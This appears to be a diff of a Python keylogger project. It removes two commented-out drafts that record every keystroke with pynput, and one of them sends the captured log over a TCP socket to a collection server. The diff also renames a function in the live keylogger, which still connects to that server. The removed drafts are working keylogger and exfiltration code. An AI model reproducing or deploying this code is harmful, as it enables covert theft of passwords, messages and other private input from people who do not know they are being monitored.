@@ -1,112 +1,3 @@
-"""import pynput
-import time
-
-COUNT = 1
-FILE = []
-
-def getID():
-    return 123456789
-
-def writeFile():
-    global COUNT
-    global FILE
-    start_time = time.time()  # Record the start time
-    
-    try:
-        file_name = f"{getID()}_{COUNT}.txt"
-        with open(file_name, 'w') as f:
-            FILE.append(file_name)
-
-            def on_press(key):
-                try:
-                    f.write(key.char)
-                except AttributeError:
-                    f.write(f"[{key}]")
-                
-                # Check elapsed time
-                if time.time() - start_time >= 10:  # 60 seconds = 1 minute
-                    return False  # Returning False stops the listener
-
-            # Create the listener
-            listener = pynput.keyboard.Listener(on_press=on_press)
-            listener.start()
-            listener.join()  # This will block until the listener is stopped or 1 minute is elapsed
-
-    except Exception as e:
-        print(f"An error occurred during writing key logger: {e}")
-    finally:
-        f.close()  # Close the file after the listener has finished
-
-if __name__ == "__main__":
-    writeFile()
-"""
-
-
-
-
-"""import pynput
-import socket
-import time
-
-COUNT = 1
-FILE = []
-
-SERVER_HOST = '127.0.0.1'
-SERVER_PORT = 55556
-
-def getID():
-    return 123456789
-
-def writeFile():
-    global COUNT
-    global FILE
-    file_name = f"{getID()}_{COUNT}.txt"
-    FILE.append(file_name)
-    
-    try:
-        with open(file_name, 'w') as f:
-            def on_press(key):
-                try:
-                    f.write(key.char)
-                except AttributeError:
-                    f.write(f"[{key}]")
-
-            # Create the listener
-            with pynput.keyboard.Listener(on_press=on_press) as listener:
-                while True:
-                    time.sleep(1)  # Sleep for 1 second before attempting connection
-
-                    try:
-                        # Try to connect to the server
-                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                            s.connect((SERVER_HOST, SERVER_PORT))
-                            print("Connected to server")
-
-                            # Send the file to the server
-                            with open(file_name, 'rb') as file:
-                                data = file.read(1024)
-                                while data:
-                                    s.sendall(data)
-                                    data = file.read(1024)
-                                print("File sent successfully")
-                            break  # Break out of the loop once file is sent
-
-                    except ConnectionRefusedError:
-                        print("Server not reachable. Continuing to capture keystrokes.")
-                    except Exception as e:
-                        print(f"An error occurred during connection to server: {e}")
-
-                listener.stop()  # Stop capturing keystrokes
-
-    except Exception as e:
-        print(f"An error occurred during writing key logger: {e}")
-
-if __name__ == "__main__":
-    writeFile()
-
-"""
-
-
 import os
 import pynput
 import socket
@@ -198,7 +89,7 @@ def connectionServer(s):
         print(f"An error occurred while connected to server: {e}")
         return False
     
-def writeFile2():
+def writeFile30Sec():
     global COUNT
     global FILE
     start_time = time.time()
@@ -273,7 +164,7 @@ def main():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((SERVER_HOST, SERVER_PORT))
             connectionServer(s)
-        if writeFile2():
+        if writeFile30Sec():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((SERVER_HOST, SERVER_PORT))
             COUNT -= 1
